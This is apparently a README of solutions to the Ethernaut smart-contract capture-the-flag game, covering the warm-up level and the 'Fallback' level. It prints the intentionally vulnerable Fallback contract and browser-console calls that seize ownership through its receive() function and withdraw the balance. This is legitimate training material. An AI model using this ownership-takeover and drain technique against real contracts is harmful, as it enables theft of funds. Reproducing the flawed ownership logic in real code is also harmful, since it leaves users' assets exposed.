# Ethernaut

My [Ethernaut](https://ethernaut.openzeppelin.com/) CTF Solutions.

## Table of Contents

<details>
<summary>
<a href="#00-hello-ethernaut">00. Hello Ethernaut</a>
</summary>
<ol>
    <li><a href="./contracts/00-hello-ethernaut/">Contracts</a></li>
    <li><a href="./scripts/00-hello-ethernaut.ts">Script</a></li>
</ol>
</details>

<details>
<summary>
<a href="#01-fallback">01. Fallback</a>
</summary>
<ol>
    <li><a href="./contracts/01-fallback/">Contracts</a></li>
    <li><a href="./scripts/01-fallback.ts">Script</a></li>
</ol>
</details>

## 00. Hello Ethernaut

This is a warm-up task. Call `await contract.info()` in the console and follow the instructions.

<details>
  <summary>Browser Console Solution</summary>

```javascript
// 1
await contract.info();
// 'You will find what you need in info1().'

// 2
await contract.info1();
// 'Try info2(), but with "hello" as a parameter.'

// 3
await contract.info2('hello');
// 'The property infoNum holds the number of the next info method to call.'

// 4
await contract.infoNum();
// {
//  ...
//  words: [42],
// };

// 5
await contract.info42();
// 'theMethodName is the name of the next method.'

// 6
await contract.theMethodName();
// 'The method name is method7123949.'

// 7
await contract.method7123949();
// 'If you know the password, submit it to authenticate().'

// 8
await contract.password();
// 'ethernaut0'

// 9
await contract.authenticate('ethernaut0');
// tx receipt...
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's move on to the next challenge! :running:

</details>

<details>
  <summary>Browser Console Solution For Cheaters</summary>

```javascript
await contract.authenticate('ethernaut0');
// tx receipt...
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's cheat the next challenge! :running:

</details>

<a href='./contracts/00-hello-ethernaut/'>Contracts</a> | <a href='./scripts/00-hello-ethernaut.ts'>Script</a>

## 01. Fallback

### Challenge

Look carefully at the contract's code below.

You will beat this level if

1. you claim ownership of the contract
2. you reduce its balance to 0

Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

<details>
  <summary>Instance</summary>

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

</details>

### Solution

<details>
  <summary>Description</summary>

In order to pass the challenge, we need to become the owner of the contract and withdraw the entire balance from the contract.

In the instance contract, the owner is set in 3 places:

1. Constructor. When deploying a contract.
2. Method `contribute`. To do this, we need to transfer at least 1 wei (but less than 0.001 Ether).
3. Method `receive`. This method is called every time we send Ether to a contract address without calling any contract function.

Understanding how `receive` works is the key to hacking this smart contract.

> You can read about how the `receive` function works in the [official docs](https://docs.soliditylang.org/en/v0.8.24/contracts.html#receive-ether-function), [stackexchange](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity).

The `receive` function checks the user has sent some non-zero amount of ether (at least 1 wei) and has already contributed some amount of ether (less than 0.001 ether) by calling the `contribute` method.

The hacking algorithm is as follows:

1. We call `contribute` and send 1 wei along with the function call.
2. We send to the contract address 1 wei. We are now the owner of the contract.
3. Call the `withdraw` function.

</details>

<details>
  <summary>Browser Console Solution</summary>

```javascript
// 1
await contract.contribute({ value: _ethers.utils.parseUnits('1', 'wei') });

// 2
await contract.sendTransaction({
  to: contract.address,
  value: _ethers.utils.parseUnits('1', 'wei'),
});

// 3
await contract.withdraw();
```

Then click the "Submit instance" button.

Congratulations! :wink: Let's move on to the next challenge! :running:

</details>

<a href='./contracts/01-fallback/'>Contracts</a> | <a href='./scripts/01-fallback.ts'>Script</a>
